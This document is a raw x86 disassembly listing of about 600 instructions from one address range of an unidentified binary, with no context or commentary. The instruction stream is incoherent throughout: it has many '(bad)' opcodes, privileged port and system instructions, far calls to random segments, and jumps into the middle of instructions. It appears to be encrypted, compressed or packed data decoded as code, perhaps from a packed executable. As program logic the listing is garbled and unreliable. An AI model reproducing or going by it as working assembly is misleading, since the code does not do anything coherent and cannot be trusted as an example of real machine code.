  40af8f:	adc    DWORD PTR [ecx+edx*4],edx
  40af92:	cld    
  40af93:	in     al,0x37
  40af95:	mov    eax,0x7ab036e2
  40af9a:	push   ss
  40af9b:	dec    ecx
  40af9c:	pop    esi
  40af9d:	je     0x40b00f
  40af9f:	fdiv   QWORD PTR [edi+0x43581b1f]
  40afa5:	jo     0x40af98
  40afa7:	xor    al,0x23
  40afa9:	jns    0x40af65
  40afab:	cwde   
  40afac:	or     eax,0xa5e25911
  40afb1:	test   DWORD PTR [ebx-0x28b45031],edx
  40afb7:	or     BYTE PTR [ebp+eiz*8+0x2f3f01c7],bl
  40afbe:	ja     0x40afc0
  40afc0:	test   edi,eax
  40afc2:	cmp    al,0xf9
  40afc4:	mov    ebp,0xe55acb63
  40afc9:	jp     0x40aff9
  40afcb:	inc    edi
  40afcc:	cmc    
  40afcd:	inc    ecx
  40afce:	cld    
  40afcf:	inc    ebp
  40afd0:	pop    ds
  40afd1:	std    
  40afd2:	push   ecx
  40afd3:	stos   BYTE PTR es:[edi],al
  40afd4:	mov    ds:0xbbee5ecd,eax
  40afd9:	mov    ds:0xbfd24628,eax
  40afde:	cld    
  40afdf:	mov    ch,0x8b
  40afe1:	dec    esi
  40afe2:	(bad)  
  40afe3:	outs   dx,BYTE PTR ds:[esi]
  40afe4:	jne    0x40b013
  40afe6:	add    eax,0xd6d1d54e
  40afeb:	call   0x22fd:0xcb744323
  40aff2:	mov    al,ds:0xe020fb55
  40aff7:	xlat   BYTE PTR ds:[ebx]
  40aff8:	aam    0xd0
  40affa:	inc    esi
  40affb:	xchg   ebx,eax
  40affc:	clc    
  40affd:	mov    eax,0xe7638cbe
  40b002:	push   edi
  40b003:	jne    0x40b002
  40b005:	out    dx,al
  40b006:	xchg   esi,eax
  40b007:	scas   al,BYTE PTR es:[edi]
  40b008:	sti    
  40b009:	repz mov ch,0x63
  40b00c:	mov    bl,0x3f
  40b00e:	or     DWORD PTR [edi-0x5a],esp
  40b011:	xchg   BYTE PTR [eax+0x3139153c],ch
  40b017:	das    
  40b018:	xchg   edi,eax
  40b019:	(bad)  
  40b01b:	xchg   DWORD PTR [ecx+0x5],esi
  40b01e:	(bad)  
  40b01f:	cmp    cl,BYTE PTR [eax]
  40b021:	loopne 0x40b02d
  40b023:	jmp    0xb9631ddd
  40b028:	in     al,0x24
  40b02a:	push   0x2c706678
  40b02f:	cmp    eax,0xb14a1f51
  40b034:	rol    BYTE PTR [edx],1
  40b036:	dec    edx
  40b037:	ret    0xc9f
  40b03a:	neg    BYTE PTR ds:[edi+0x48]
  40b03e:	add    ah,0x3d
  40b041:	icebp  
  40b042:	or     eax,0x95b1c314
  40b047:	and    BYTE PTR [edi-0xb],0xe
  40b04b:	xchg   DWORD PTR [ecx-0x5a],ebp
  40b04e:	std    
  40b04f:	(bad)  
  40b050:	mov    eax,0xa5e88bb6
  40b055:	iret   
  40b056:	adc    dh,BYTE PTR [esi-0xfdb300d]
  40b05c:	call   0xd3c2:0x5e5179bc
  40b063:	addr16 or al,0xf3
  40b066:	jmp    0x40b0e1
  40b068:	daa    
  40b069:	jl     0x40b0b6
  40b06b:	lods   al,BYTE PTR ds:[esi]
  40b06c:	std    
  40b06d:	imul   esp,DWORD PTR es:[ecx+esi*8],0xffffffa8
  40b072:	adc    BYTE PTR cs:[ebx],al
  40b075:	xchg   dl,cl
  40b077:	enter  0xbc3c,0xe4
  40b07b:	(bad)  
  40b07e:	jmp    0xfd7cf361
  40b083:	jnp    0x40b0d1
  40b085:	pop    es
  40b086:	jg     0x40b0e9
  40b088:	sbb    DWORD PTR [edi+0x24],ecx
  40b08b:	je     0x40b056
  40b08d:	push   0x7b7d1b4b
  40b092:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b093:	dec    esi
  40b094:	fidiv  WORD PTR [ebx-0x156afa7e]
  40b09a:	mov    edi,0xb7c6ef7c
  40b09f:	adc    esp,eax
  40b0a1:	stc    
  40b0a2:	rol    DWORD PTR [ebx+0xe54472],cl
  40b0a8:	push   eax
  40b0a9:	inc    edx
  40b0aa:	adc    al,0xfc
  40b0ac:	or     dl,BYTE PTR [ecx]
  40b0ae:	mov    bl,0x7d
  40b0b0:	lods   eax,DWORD PTR ds:[esi]
  40b0b1:	int    0xca
  40b0b3:	sbb    eax,0x939ffaa5
  40b0b8:	jg     0x40b122
  40b0ba:	xchg   eax,esp
  40b0bc:	mov    cl,0x9e
  40b0be:	push   ecx
  40b0bf:	adc    edi,DWORD PTR [esi]
  40b0c1:	test   eax,0x97e2b221
  40b0c6:	fisubr WORD PTR [ebp+edx*8-0x27cc5e6a]
  40b0cd:	out    dx,al
  40b0ce:	add    edx,esp
  40b0d0:	dec    edx
  40b0d1:	ins    DWORD PTR es:[edi],dx
  40b0d2:	scas   eax,DWORD PTR es:[edi]
  40b0d3:	inc    edi
  40b0d4:	into   
  40b0d5:	rol    DWORD PTR [edx+eax*2-0x5488b832],cl
  40b0dc:	cmp    al,0x42
  40b0de:	mov    ebp,0xf7910c84
  40b0e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0e4:	aad    0x5a
  40b0e6:	sbb    ebp,edx
  40b0e8:	aas    
  40b0e9:	add    eax,0x7e1a8fbe
  40b0ee:	rol    DWORD PTR [ebx+0xf10f64],0xac
  40b0f5:	test   BYTE PTR [esi],ah
  40b0f7:	xor    ah,BYTE PTR [ebx+0x5c]
  40b0fa:	ds pop edi
  40b0fc:	xor    bl,dh
  40b0fe:	add    dh,BYTE PTR [eax+0x6c149add]
  40b104:	(bad)  
  40b105:	outs   dx,BYTE PTR ds:[esi]
  40b106:	retf   
  40b107:	mov    edi,0x74cc1c8
  40b10c:	pop    ds
  40b10d:	push   ss
  40b10e:	xor    al,BYTE PTR [edi+0x8636203]
  40b114:	jo     0x40b09a
  40b116:	das    
  40b117:	dec    eax
  40b118:	and    DWORD PTR [eax-0x6dbdfbc],ecx
  40b11e:	in     al,dx
  40b11f:	push   edi
  40b120:	jne    0x40b184
  40b122:	xchg   esp,eax
  40b123:	adc    DWORD PTR [ebx+0xc],esi
  40b126:	pop    ds
  40b127:	sub    bh,dl
  40b129:	add    DWORD PTR [eax-0x5aa6782c],edx
  40b12f:	push   0x96a0f506
  40b134:	imul   ebx,DWORD PTR [edi+0x38],0x3e
  40b138:	lea    ebp,[edi-0x5a80ac72]
  40b13e:	retf   0x620a
  40b141:	pop    eax
  40b142:	fsub   DWORD PTR [esi]
  40b144:	or     BYTE PTR [edi-0xb6971a3],al
  40b14a:	xchg   ebx,eax
  40b14b:	mov    al,ds:0x6dd65a
  40b150:	cmp    ebp,0x9a6cc738
  40b156:	sub    ebp,0xd3fa450b
  40b15c:	and    al,0xc8
  40b15e:	dec    ecx
  40b15f:	mov    esi,0x6ed4f7b3
  40b164:	xchg   ebx,eax
  40b165:	leave  
  40b166:	stos   BYTE PTR es:[edi],al
  40b167:	xor    eax,0x1cf78e65
  40b16c:	xchg   DWORD PTR [ecx-0x2bdf4b5c],eax
  40b172:	xchg   ebx,eax
  40b173:	call   FWORD PTR [eax-0x27]
  40b176:	mov    bh,0x32
  40b178:	aam    0xb7
  40b17a:	push   eax
  40b17b:	xor    al,0x9c
  40b17d:	fcmovnbe st,st(7)
  40b17f:	scas   eax,DWORD PTR es:[edi]
  40b180:	pop    ebp
  40b181:	scas   al,BYTE PTR es:[edi]
  40b182:	ficomp WORD PTR [esi]
  40b184:	mov    edx,0x2132d032
  40b189:	popf   
  40b18a:	fisub  WORD PTR [eax]
  40b18c:	sub    BYTE PTR ds:0x1d3938a7,ch
  40b192:	sar    DWORD PTR [edi+0x20387ea3],cl
  40b198:	mov    eax,0x904e1977
  40b19d:	ror    BYTE PTR ds:0x5d3bad73,cl
  40b1a3:	stc    
  40b1a4:	xlat   BYTE PTR ds:[ebx]
  40b1a5:	int    0x26
  40b1a7:	repz into 
  40b1a9:	call   0x170dfb61
  40b1ae:	enter  0x41ec,0x7
  40b1b2:	retf   0xae0c
  40b1b5:	enter  0x16d3,0x94
  40b1b9:	aam    0xe8
  40b1bb:	sub    BYTE PTR [ebx],al
  40b1bd:	fs jle 0x40b1aa
  40b1c0:	icebp  
  40b1c1:	xor    ch,ah
  40b1c3:	push   ecx
  40b1c4:	test   eax,0xe28fe3a5
  40b1c9:	add    eax,edi
  40b1cb:	sar    BYTE PTR [ecx+0x6a],cl
  40b1ce:	mov    ecx,0x93deb43b
  40b1d3:	push   esp
  40b1d4:	xchg   edx,eax
  40b1d5:	sub    al,0x47
  40b1d7:	ficom  WORD PTR [ebp-0x2b]
  40b1da:	cs stc 
  40b1dc:	jmp    0xc0a66a19
  40b1e1:	adc    esp,DWORD PTR [ecx+0x77baaf77]
  40b1e7:	ret    0xdc93
  40b1ea:	mov    bh,0x6c
  40b1ec:	xchg   ebp,eax
  40b1ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1ee:	mov    ecx,0xc9d7229c
  40b1f3:	xchg   ecx,eax
  40b1f4:	gs pop ds
  40b1f6:	frstor [edi+eiz*1]
  40b1f9:	scas   eax,DWORD PTR es:[edi]
  40b1fa:	mov    ecx,0xd72b04c
  40b1ff:	jb     0x40b269
  40b201:	mov    ecx,0xdd065575
  40b206:	sub    BYTE PTR [esi+0x7c12a07b],cl
  40b20c:	stos   DWORD PTR es:[edi],eax
  40b20d:	(bad)  
  40b20e:	pop    esp
  40b20f:	repz std 
  40b211:	dec    eax
  40b212:	xchg   edi,eax
  40b213:	fwait
  40b214:	aaa    
  40b215:	jge    0x40b1d8
  40b217:	loopne 0x40b259
  40b219:	mov    BYTE PTR [esi],0x9
  40b21c:	dec    esp
  40b21d:	ins    BYTE PTR es:[edi],dx
  40b21e:	(bad)  
  40b21f:	inc    ah
  40b221:	mov    edi,0x21b648f1
  40b226:	dec    edi
  40b227:	xchg   ecx,eax
  40b228:	mov    DWORD PTR [ebx],edi
  40b22a:	aaa    
  40b22b:	jnp    0x40b22d
  40b22d:	jecxz  0x40b243
  40b22f:	and    eax,0x6a473dc2
  40b234:	xor    eax,0x21206969
  40b239:	adc    esi,ebx
  40b23b:	(bad)  
  40b23c:	ror    DWORD PTR ds:0x451e5772,cl
  40b242:	outs   dx,DWORD PTR ds:[esi]
  40b243:	mov    ecx,ecx
  40b245:	sbb    ebx,DWORD PTR [ebp+0x2e]
  40b248:	pop    eax
  40b249:	sbb    al,ah
  40b24b:	inc    ebx
  40b24c:	popa   
  40b24d:	neg    ecx
  40b24f:	sbb    dh,BYTE PTR [eax+0x11020be9]
  40b255:	repz loopne 0x40b1fd
  40b258:	fs in  al,dx
  40b25a:	and    DWORD PTR [edx+0x49297d8f],ebp
  40b260:	jle    0x40b272
  40b262:	js     0x40b27a
  40b264:	ret    0x3027
  40b267:	not    DWORD PTR [ecx-0x64]
  40b26a:	sub    al,0xd0
  40b26c:	mov    ebx,0xf5f15593
  40b271:	push   ds
  40b272:	cwde   
  40b273:	mov    WORD PTR [edi],?
  40b275:	xchg   DWORD PTR [edi+0x16c567de],edi
  40b27b:	add    eax,0x8d820fce
  40b280:	or     DWORD PTR [ecx-0x738aeeea],ecx
  40b286:	and    BYTE PTR [ecx],0xd9
  40b289:	ror    bh,0xc5
  40b28c:	es inc esi
  40b28e:	xchg   ebp,eax
  40b28f:	lea    edi,[eax+0x6b]
  40b292:	xchg   esp,eax
  40b293:	in     eax,0x39
  40b295:	push   ss
  40b296:	pusha  
  40b297:	sub    esi,DWORD PTR ds:0xa129f411
  40b29d:	fwait
  40b29e:	mov    edx,0x7b903d44
  40b2a3:	out    0x71,eax
  40b2a5:	fisubr WORD PTR [ebx+0x37]
  40b2a8:	sbb    ebp,esi
  40b2aa:	push   ss
  40b2ab:	div    DWORD PTR [esi-0x1b]
  40b2ae:	adc    al,BYTE PTR [esi]
  40b2b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2b1:	sbb    eax,0xd94e8f27
  40b2b6:	in     eax,0xa2
  40b2b8:	or     eax,0xfaec7990
  40b2bd:	jno    0x40b2c9
  40b2bf:	xor    DWORD PTR [ebp+0x3236c0af],0xffffff88
  40b2c6:	xchg   BYTE PTR [esi],ch
  40b2c8:	ss push edx
  40b2ca:	cmc    
  40b2cb:	pusha  
  40b2cc:	nop
  40b2cd:	rcl    ecx,0x87
  40b2d0:	push   ebx
  40b2d1:	xlat   BYTE PTR ds:[ebx]
  40b2d2:	sub    BYTE PTR [ebp-0x2d7862ef],bh
  40b2d8:	sbb    eax,0xc7eaddf6
  40b2dd:	ins    BYTE PTR es:[edi],dx
  40b2de:	and    bl,ah
  40b2e0:	xor    eax,0xad1c7377
  40b2e5:	mov    edx,0x4cb9db20
  40b2ea:	out    dx,al
  40b2eb:	test   eax,0xbdedeb0d
  40b2f0:	xchg   esi,eax
  40b2f1:	sub    ch,BYTE PTR [eax-0x74]
  40b2f4:	ds shl dh,cl
  40b2f7:	jl     0x40b323
  40b2f9:	xchg   ebx,eax
  40b2fa:	adc    eax,0x6bd7dfaa
  40b2ff:	lds    edi,FWORD PTR [ecx-0x3d]
  40b302:	popa   
  40b303:	pop    edx
  40b304:	scas   al,BYTE PTR es:[edi]
  40b305:	imul   eax,esp,0xe666553d
  40b30b:	test   eax,0xdb1fc6b9
  40b310:	(bad)  
  40b311:	cld    
  40b312:	xor    al,0xf
  40b314:	sti    
  40b315:	cmp    eax,0xd72bbefe
  40b31a:	add    ch,BYTE PTR [esi-0x2d]
  40b31d:	pushf  
  40b31e:	jl     0x40b39d
  40b320:	dec    edi
  40b321:	pusha  
  40b322:	adc    eax,ecx
  40b324:	pop    esi
  40b325:	mov    al,ch
  40b327:	bnd jge 0x40b2bb
  40b32a:	jl     0x40b353
  40b32c:	inc    edx
  40b32d:	stos   DWORD PTR es:[edi],eax
  40b32e:	mov    esp,0x750dda6a
  40b333:	mov    ch,0xc2
  40b335:	jge    0x40b31f
  40b337:	sub    al,0x6a
  40b339:	cs stos DWORD PTR es:[edi],eax
  40b33b:	sbb    al,BYTE PTR [esi]
  40b33d:	push   eax
  40b33e:	or     ebx,ebp
  40b340:	in     eax,dx
  40b341:	mov    DWORD PTR [esi],edx
  40b343:	fdivr  DWORD PTR [ecx+0x68782885]
  40b349:	sub    edx,ebp
  40b34b:	(bad)  
  40b34c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b34d:	lds    edx,FWORD PTR [edi-0x2727f159]
  40b353:	jno    0x40b3b5
  40b355:	(bad)  
  40b356:	(bad)  
  40b357:	shl    DWORD PTR ds:0x54fcf17,cl
  40b35d:	adc    DWORD PTR [edi-0x5cfaacf5],edx
  40b363:	dec    ebx
  40b364:	add    eax,0x9bff7747
  40b369:	mov    esi,DWORD PTR [edx+0x63]
  40b36c:	jno    0x40b3a2
  40b36e:	aaa    
  40b36f:	push   ds
  40b370:	shr    BYTE PTR ds:0xa64809b6,cl
  40b376:	fld    TBYTE PTR [edi]
  40b378:	push   DWORD PTR [ebp-0x10]
  40b37b:	pop    ecx
  40b37c:	cld    
  40b37d:	loop   0x40b31d
  40b37f:	jmp    0xf9b74e3c
  40b384:	fucomip st,st(1)
  40b386:	inc    esp
  40b387:	and    al,0x7f
  40b389:	adc    ch,al
  40b38b:	jo     0x40b392
  40b38d:	jp     0x40b3ed
  40b38f:	dec    edi
  40b390:	sbb    dl,BYTE PTR [esi]
  40b392:	test   al,0xa1
  40b394:	add    DWORD PTR [ebx],esp
  40b396:	jnp    0x40b371
  40b398:	ins    BYTE PTR es:[edi],dx
  40b399:	dec    edx
  40b39a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b39b:	daa    
  40b39c:	xor    DWORD PTR [eax],ebp
  40b39e:	adc    dh,ch
  40b3a0:	imul   ebx,DWORD PTR [ebx+0x5f],0xf95832dc
  40b3a7:	inc    esp
  40b3a8:	fimul  WORD PTR [edi]
  40b3aa:	cmp    DWORD PTR [ebx-0x4ca989fa],ebp
  40b3b0:	out    dx,eax
  40b3b1:	cld    
  40b3b2:	pusha  
  40b3b3:	sysret 
  40b3b5:	and    DWORD PTR ss:[ebx-0x2b],ebx
  40b3b9:	std    
  40b3ba:	adc    eax,0xf5c697c2
  40b3bf:	out    0xf6,al
  40b3c1:	dec    ebx
  40b3c2:	retf   0x2708
  40b3c5:	inc    ebp
  40b3c6:	mov    ebx,0xfc04f1d5
  40b3cb:	xchg   ecx,eax
  40b3cc:	scas   eax,DWORD PTR es:[edi]
  40b3cd:	xor    esi,DWORD PTR [edx]
  40b3cf:	sbb    eax,0xe528560f
  40b3d4:	xchg   DWORD PTR [edi],esi
  40b3d6:	nop
  40b3d7:	stos   BYTE PTR es:[edi],al
  40b3d8:	(bad)  [esi-0x36]
  40b3db:	and    ah,BYTE PTR [eax]
  40b3dd:	cmp    DWORD PTR [ebx+0x79],edx
  40b3e0:	mov    bl,0x8
  40b3e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3e3:	mov    ah,0x4a
  40b3e5:	(bad)  
  40b3e6:	mov    ds:0x3c7a1f8f,eax
  40b3eb:	std    
  40b3ec:	add    al,0x46
  40b3ee:	mul    ecx
  40b3f0:	pop    esi
  40b3f1:	dec    eax
  40b3f2:	ret    0x4fc0
  40b3f5:	cli    
  40b3f6:	xor    ebp,ebp
  40b3f8:	fild   DWORD PTR [edi]
  40b3fa:	enter  0xf424,0x94
  40b3fe:	cdq    
  40b3ff:	shl    dh,0x1
  40b402:	mov    ds:0x63fecd93,al
  40b407:	sub    ebp,DWORD PTR [ecx-0x48e6bf0e]
  40b40d:	mov    ebp,0x43d1082f
  40b412:	mov    edi,0xc16fcbc1
  40b417:	(bad)  
  40b418:	aad    0x40
  40b41a:	push   cs
  40b41b:	sub    BYTE PTR [edx+0x3b935014],bl
  40b421:	sbb    DWORD PTR [esi-0x52],esi
  40b424:	dec    esi
  40b425:	in     eax,dx
  40b426:	or     BYTE PTR [ebx+0x520fb528],dh
  40b42c:	pop    ss
  40b42d:	add    eax,0x4566a468
  40b432:	call   0xb874:0x4b088f2a
  40b439:	inc    edx
  40b43a:	data16 ins BYTE PTR es:[edi],dx
  40b43c:	or     dl,BYTE PTR [eax]
  40b43e:	ins    BYTE PTR es:[edi],dx
  40b43f:	imul   eax,DWORD PTR [ebx],0x3937af4f
  40b445:	inc    edx
  40b446:	jb     0x40b401
  40b448:	in     al,dx
  40b449:	adc    al,0x2
  40b44b:	pop    edi
  40b44c:	sahf   
  40b44d:	outs   dx,BYTE PTR ds:[esi]
  40b44e:	test   eax,0x3557e72
  40b453:	add    al,0xff
  40b455:	jle    0x40b482
  40b457:	into   
  40b458:	xchg   esi,eax
  40b459:	in     eax,dx
  40b45a:	rcl    DWORD PTR [ebx],1
  40b45c:	inc    ebx
  40b45d:	fnsave ds:0xbb617fa1
  40b463:	sbb    edx,eax
  40b465:	(bad)  
  40b466:	dec    edi
  40b467:	inc    eax
  40b468:	xchg   esp,eax
  40b469:	call   0x385c:0xbef8ed3
  40b470:	jns    0x40b481
  40b472:	jecxz  0x40b4d7
  40b474:	out    0x87,al
  40b476:	cmc    
  40b477:	or     DWORD PTR [ecx],ebx
  40b479:	retf   0xcc76
  40b47c:	sbb    cl,BYTE PTR [edx+0xfb92310]
  40b482:	sub    eax,0xd0edbbf7
  40b487:	aaa    
  40b488:	pop    ss
  40b489:	push   ecx
  40b48a:	push   cs
  40b48b:	push   ebx
  40b48c:	mov    al,ds:0x8b9a7ec2
  40b491:	xchg   DWORD PTR [edx+0x6a60bcd5],eax
  40b497:	mov    bl,0x39
  40b499:	or     al,0xb3
  40b49b:	test   al,0x16
  40b49d:	aaa    
  40b49e:	xchg   esp,eax
  40b49f:	inc    ebp
  40b4a0:	dec    esi
  40b4a1:	fmul   st,st(0)
  40b4a3:	sbb    ebp,DWORD PTR [edi]
  40b4a5:	jle    0x40b49c
  40b4a7:	loop   0x40b45e
  40b4a9:	call   0xa765a032
  40b4ae:	retf   0x32f5
  40b4b1:	outs   dx,DWORD PTR ds:[esi]
  40b4b2:	sub    BYTE PTR [edx-0x15],al
  40b4b5:	rcl    DWORD PTR [ebp+0x20083b9c],cl
  40b4bb:	repz in al,dx
  40b4bd:	fwait
  40b4be:	outs   dx,DWORD PTR ds:[esi]
  40b4bf:	mov    bh,0x4a
  40b4c1:	mov    esp,0x9c51be08
  40b4c6:	std    
  40b4c7:	mov    dl,0xb0
  40b4c9:	or     DWORD PTR [esi-0x649c68dd],0xffffff97
  40b4d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4d1:	and    ch,dl
  40b4d3:	iret   
  40b4d4:	ins    DWORD PTR es:[edi],dx
  40b4d5:	sbb    al,0xd0
  40b4d7:	sbb    eax,0x96038289
  40b4dc:	cmp    dl,bh
  40b4de:	inc    eax
  40b4df:	shr    ah,0x39
  40b4e2:	shld   esp,esp,0xdc
  40b4e6:	push   esi
  40b4e7:	add    eax,0xab5a3722
  40b4ec:	mov    al,0x6a
  40b4ee:	jecxz  0x40b4a0
  40b4f0:	push   edx
  40b4f1:	jg     0x40b511
  40b4f3:	jecxz  0x40b53b
  40b4f5:	out    0x22,eax
  40b4f7:	repnz in al,dx
  40b4f9:	dec    edx
  40b4fa:	jmp    0x1ac:0xf9650426
  40b501:	std    
  40b502:	mov    eax,ds:0xdee1842b
  40b507:	pushf  
  40b508:	cld    
  40b509:	(bad)  
  40b50a:	pop    ebx
  40b50b:	jmp    0x8004:0x3bb645bb
  40b512:	xchg   edx,eax
  40b513:	loope  0x40b50c
  40b515:	ins    BYTE PTR es:[edi],dx
  40b516:	in     al,0x1d
  40b518:	(bad)  
  40b51a:	mov    esi,0xe5256b58
  40b51f:	shl    BYTE PTR [edi-0x677183c3],1
  40b525:	mov    edi,0x82210737
  40b52a:	popf   
  40b52b:	mov    ds:0x3fc3261b,al
  40b530:	sbb    al,BYTE PTR [esi-0x278f455c]
  40b536:	data16 out dx,al
  40b538:	xor    eax,0x6c4c498b
  40b53d:	mov    ds:0x15f0d81f,eax
  40b542:	cmovno ecx,DWORD PTR [esi-0x4c]
  40b546:	mov    BYTE PTR [ebx],bl
  40b548:	sub    DWORD PTR [ecx+0x7fed2105],eax
  40b54e:	pop    ss
  40b54f:	add    al,0x6f
  40b551:	or     DWORD PTR [ecx-0x78],eax
  40b554:	xor    al,0x17
  40b556:	cmp    DWORD PTR [ebp-0x50],edi
  40b559:	enter  0xb591,0x72
  40b55d:	jmp    0x40b5c5
  40b55f:	scas   eax,DWORD PTR es:[edi]
  40b560:	stos   DWORD PTR es:[edi],eax
  40b561:	ds jl  0x40b50c
  40b564:	xchg   esp,eax
  40b565:	inc    esi
  40b566:	sub    al,0xa6
  40b568:	cmc    
  40b569:	imul   ecx,DWORD PTR [edi-0x1c],0x1c
  40b56d:	xor    bh,al
  40b56f:	aad    0x27
  40b571:	pusha  
  40b572:	add    al,BYTE PTR [ebp+eax*4-0x74]
  40b576:	ins    BYTE PTR es:[edi],dx
  40b577:	out    dx,al
  40b578:	push   edx
  40b579:	dec    esp
  40b57a:	push   ebp
  40b57b:	aam    0x57
  40b57d:	xor    esi,edi
  40b57f:	push   ebp
  40b580:	mov    al,bh
  40b582:	fsub   DWORD PTR [edx]
  40b584:	stos   BYTE PTR es:[edi],al
  40b585:	sub    DWORD PTR [ecx],ebp
  40b587:	push   cs
  40b588:	push   esp
  40b589:	jge    0x40b58f
  40b58b:	inc    ebx
  40b58c:	jl     0x40b5ad
  40b58e:	cld    
  40b58f:	fcomp  QWORD PTR [esi-0x3a727b2c]
  40b595:	push   0x756a39f5
  40b59a:	mov    DWORD PTR [ecx],0xea470ee
  40b5a0:	xchg   BYTE PTR [ebp+0x25],al
  40b5a3:	js     0x40b54f
  40b5a5:	aas    
  40b5a6:	das    
  40b5a7:	lea    ebp,[esi]
  40b5a9:	sti    
  40b5aa:	daa    
  40b5ab:	test   dh,bl
  40b5ad:	loope  0x40b554
  40b5af:	mov    edx,0x80a5ec96
  40b5b4:	js     0x40b5e9
  40b5b6:	cli    
  40b5b7:	adc    DWORD PTR [ebx],eax
  40b5b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5ba:	(bad)  
  40b5bb:	xchg   ebx,eax
  40b5bc:	sti    
  40b5bd:	aaa    
  40b5be:	mov    ds:0x42bd5b7e,eax
  40b5c3:	adc    bh,BYTE PTR [eax-0x5a]
  40b5c6:	ret    0x2588
  40b5c9:	dec    edx
  40b5ca:	pushf  
  40b5cb:	lds    edx,FWORD PTR ss:[edi-0x22]
  40b5cf:	sbb    DWORD PTR [esi+ebp*1+0x46ecd25],esi
  40b5d6:	int3   
  40b5d7:	ins    DWORD PTR es:[edi],dx
  40b5d8:	sti    
  40b5d9:	push   ebx
  40b5da:	inc    ebx
  40b5db:	cs or  al,0x1c
  40b5df:	mov    al,0x21
  40b5e1:	ins    BYTE PTR es:[edi],dx
  40b5e2:	lahf   
  40b5e3:	je     0x40b65f
  40b5e5:	fimul  WORD PTR [edx*2-0x6ede6182]
  40b5ec:	push   edx
  40b5ed:	dec    edx
  40b5ee:	pop    es
  40b5ef:	imul   ecx,DWORD PTR [ebp+0x1e],0x79e0a365
  40b5f6:	mov    bl,0xf6
  40b5f8:	aad    0xa3
  40b5fa:	inc    ebx
  40b5fb:	fnstenv ds:0x9c4d1da8
  40b601:	inc    esi
  40b602:	ja     0x40b5bf
  40b604:	xchg   edi,eax
  40b605:	jp     0x40b671
  40b607:	xchg   esi,eax
  40b608:	mov    bl,0xde
  40b60a:	into   
  40b60b:	xor    BYTE PTR [eax-0x73],al
  40b60e:	mov    dh,0xc0
  40b610:	fadd   DWORD PTR [ebx+eax*2-0x1d]
  40b614:	push   0x9e4cb037
  40b619:	and    bh,0xf2
  40b61c:	adc    eax,0xcc0c77f4
  40b621:	(bad)  
  40b622:	(bad)  [ebx]
  40b624:	cmp    eax,0x82782224
  40b629:	int3   
  40b62a:	ins    DWORD PTR es:[edi],dx
  40b62b:	ss out dx,eax
  40b62d:	or     ch,dh
  40b62f:	pop    ss
  40b630:	add    ah,cl
  40b632:	fdiv   DWORD PTR [ebp+0x7ff4af06]
  40b638:	lds    edx,FWORD PTR [esi+0x12785459]
  40b63e:	(bad)  
  40b63f:	xor    eax,esi
  40b641:	repnz xchg ebx,eax
  40b643:	pop    ecx
  40b644:	sbb    eax,0x64ea1140
  40b649:	sub    eax,0x41369c33
  40b64e:	mov    al,0x64
  40b650:	pop    ebp
  40b651:	das    
  40b652:	jmp    0x40b6a0
  40b654:	cmp    ebx,ebx
  40b656:	cmp    al,0x23
  40b658:	bound  eax,QWORD PTR [eax+eiz*1-0x3c]
  40b65c:	les    ebx,FWORD PTR [ecx]
  40b65e:	fist   DWORD PTR ds:0x8c0d5045
  40b664:	lods   al,BYTE PTR ds:[esi]
  40b665:	pop    eax
  40b666:	pop    ebp
  40b667:	ins    DWORD PTR es:[edi],dx
  40b668:	xor    ebp,esp
  40b66a:	fs jns 0x40b62e
  40b66d:	cli    
  40b66e:	dec    edx
  40b66f:	add    DWORD PTR [edx],edi
  40b671:	push   0xfc7e4c78
  40b676:	lds    edx,FWORD PTR [ecx]
  40b678:	jl     0x40b64a
  40b67a:	push   es
  40b67b:	aaa    
  40b67c:	ins    DWORD PTR es:[edi],dx
  40b67d:	add    al,0xa8
  40b67f:	pop    ebp
  40b680:	push   0x38850446
  40b685:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b686:	cwde   
  40b687:	push   ebx
  40b688:	or     eax,0x42e504be
  40b68d:	phaddd mm1,mm5
  40b691:	sub    eax,0xde0039e4
  40b696:	push   0x13
  40b698:	xor    esp,ecx
  40b69a:	repnz sub DWORD PTR [eax-0x1b],eax
  40b69e:	leave  
  40b69f:	jp     0x40b6f3
  40b6a1:	cmp    DWORD PTR [ebx+0x6b],esi
  40b6a4:	jmp    0x40b630
  40b6a6:	pop    es
  40b6a7:	dec    ebp
  40b6a8:	or     ebx,DWORD PTR [ebx-0x20]
  40b6ab:	in     eax,0x3b
  40b6ad:	sahf   
  40b6ae:	ret    
  40b6af:	leave  
  40b6b0:	shr    BYTE PTR [ecx-0x612c2615],0x6d
  40b6b7:	mov    ds:0xc92e59c2,al
  40b6bc:	div    DWORD PTR [edi-0x7]
  40b6bf:	pop    ecx
  40b6c0:	ins    BYTE PTR es:[edi],dx
  40b6c1:	or     DWORD PTR [si-0x6b02],edi
  40b6c6:	(bad)  
  40b6c7:	clc    
  40b6c8:	pop    esi
  40b6c9:	mov    esp,0xf9bc744
  40b6ce:	push   esi
  40b6cf:	das    
  40b6d0:	imul   edx,DWORD PTR [ebp+0x5a],0x46
  40b6d4:	repnz ins DWORD PTR es:[edi],dx
  40b6d6:	push   0xffb928c6
  40b6db:	pushaw 
  40b6dd:	or     ebp,DWORD PTR [ebp+0x571bff38]
  40b6e3:	jno    0x40b708
  40b6e5:	sub    BYTE PTR [ebx-0x48],bl
  40b6e8:	daa    
  40b6e9:	clc    
  40b6ea:	popa   
  40b6eb:	popa   
  40b6ec:	sbb    ebp,edi
  40b6ee:	je     0x40b6b1
  40b6f0:	mov    ebp,DWORD PTR [esi-0x21]
  40b6f3:	stc    
  40b6f4:	sub    BYTE PTR [ebp+0x36dedf21],al
  40b6fa:	(bad)  
  40b6fb:	pop    ebp
  40b6fc:	sub    al,0x41
  40b6fe:	ret    0xd86d
  40b701:	aaa    
  40b702:	test   bl,0x73
  40b705:	mov    edi,0xea4a0d85
  40b70a:	es jbe 0x40b6db
  40b70d:	pop    eax
  40b70e:	add    ebx,DWORD PTR [edi+0x46510151]
  40b714:	into   
  40b715:	push   ds
  40b716:	and    ecx,eax
  40b718:	das    
